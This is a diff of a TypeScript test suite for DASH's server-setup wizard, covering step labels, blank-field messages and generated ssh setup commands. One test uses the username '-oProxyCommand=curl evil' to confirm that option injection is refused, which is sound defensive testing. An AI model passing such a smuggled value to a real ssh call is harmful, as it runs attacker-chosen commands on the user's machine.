@@ -24,6 +24,7 @@ import {
   describeHostingRecommendation,
   describeKeyStep,
   describeProviderChoice,
+  describeSetupRecipe,
   describeStep,
   everyWizardSentence,
   providerOption,
@@ -45,9 +46,17 @@ describe("the three steps", () => {
     // The concept's rail reads TYPE — VPS_CONFIG — PARAMS — INIT. Three of those
     // four are DASH's vocabulary wearing a costume, and MAR-528's adoption is
     // explicit that the caps are typography and the words stay English.
+    /*
+     * MAR-871 renamed the middle one. It read "The key" while the step's own
+     * content had been the one-paste setup text since MAR-573, and the attended
+     * run of 2026-09-05 recorded the rail naming the older, smaller thing — so
+     * a person reading the rail to see what was left to do was told the wrong
+     * thing about the step they were standing on. The invariant is unchanged:
+     * every label is plain English for what the person does there.
+     */
     expect(WIZARD_STEPS.map((step) => describeStep(step).label)).toEqual([
       "How to reach it",
-      "The key",
+      "Set it up",
       "Check",
     ]);
   });
@@ -244,6 +253,115 @@ describe("the deploy receipt, before there is an agent to name", () => {
     expect(describeDeployArrangement("My server").limits[2]).toContain(
       "Turning this off in DASH does not stop it",
     );
+  });
+});
+
+/* ---------------------------------------------------------------------- *
+ * MAR-871
+ * ---------------------------------------------------------------------- */
+
+describe("a field nobody has typed into", () => {
+  /*
+   * The attended run of 2026-09-05 left *Account on the server* blank and was
+   * shown `"" is not an account name DASH will sign in with.` — two quote marks
+   * at a novice, on the one field of the five they genuinely cannot guess.
+   */
+  it("never quotes an empty value back at somebody", () => {
+    for (const draft of [
+      { ...good, username: "" },
+      { ...good, address: "" },
+    ]) {
+      const check = checkDraft(draft);
+      expect(check.ok).toBe(false);
+      if (!check.ok) {
+        expect(check.detail).not.toContain('""');
+        expect(check.detail).not.toMatch(/^"" /u);
+      }
+    }
+  });
+
+  it("answers the question the field asked, and says where to find the answer", () => {
+    const blank = checkDraft({ ...good, username: "" });
+    expect(blank.ok).toBe(false);
+    if (!blank.ok) {
+      // Not a rejection. "Type the account name" is only useful to somebody who
+      // knows what theirs is, and the person who left this field alone is
+      // exactly the person who does not.
+      expect(blank.detail).toMatch(/your provider/i);
+      expect(blank.detail).toContain("root");
+    }
+  });
+
+  it("still quotes a value somebody did type", () => {
+    // The refusal that names what it rejected is right for a wrong value and
+    // useless for a missing one. Only the second case changed.
+    const wrong = checkDraft({ ...good, username: "Not An Account" });
+    expect(wrong.ok).toBe(false);
+    if (!wrong.ok) {
+      expect(wrong.detail).toContain("Not An Account");
+    }
+  });
+
+  it("leaves every other refusal exactly where MAR-484 put it", () => {
+    // The security refusal is checked before the patterns and is not reachable
+    // through the two sentences above.
+    const injected = checkDraft({ ...good, username: "-oProxyCommand=curl evil" });
+    expect(injected.ok).toBe(false);
+    if (!injected.ok) {
+      expect(injected.problem).toBe("option_injection");
+    }
+  });
+});
+
+describe("the setup recipe", () => {
+  const recipe = describeSetupRecipe({
+    label: "My server",
+    address: "example.com",
+    username: "root",
+    port: 22,
+  });
+
+  it("names the program to open before the line to type in it", () => {
+    /*
+     * The gap the attended run stopped at. The shipped step said to use *"any
+     * terminal you already sign in with"* — a sentence that assumes the reader
+     * has one, has signed in before, and knows the address.
+     */
+    expect(recipe.steps[0]?.text).toMatch(/PowerShell/);
+    expect(recipe.steps[0]?.command).toBeNull();
+    expect(recipe.steps[1]?.command).toBe("ssh root@example.com");
+  });
+
+  it("says whose password the server will ask for, because it is not DASH's", () => {
+    // The one prompt in this flow that DASH cannot answer and does not want to.
+    // A recipe that stayed silent about it strands somebody at it.
+    const asked = recipe.steps.map((step) => step.text).join(" ");
+    expect(asked).toMatch(/password/i);
+    expect(asked).toMatch(/your provider set/i);
+  });
+
+  it("carries the port only when it is not the ordinary one", () => {
+    expect(
+      describeSetupRecipe({ label: "x", address: "example.com", username: "root", port: 2222 })
+        .steps[1]?.command,
+    ).toBe("ssh -p 2222 root@example.com");
+  });
+
+  it("keeps the command out of every sentence", () => {
+    /*
+     * The rule the public key and the fingerprint are already under on this
+     * surface: a value is drawn as a value, in its own element. It is also what
+     * lets the copy sweep run over the steps without scanning somebody's own
+     * server address.
+     */
+    for (const step of recipe.steps) {
+      expect(step.text).not.toContain("ssh ");
+      expect(step.text).not.toContain("example.com");
+    }
+  });
+
+  it("ends on the control the card actually has", () => {
+    expect(recipe.next_action).toContain("Check now");
   });
 });
 
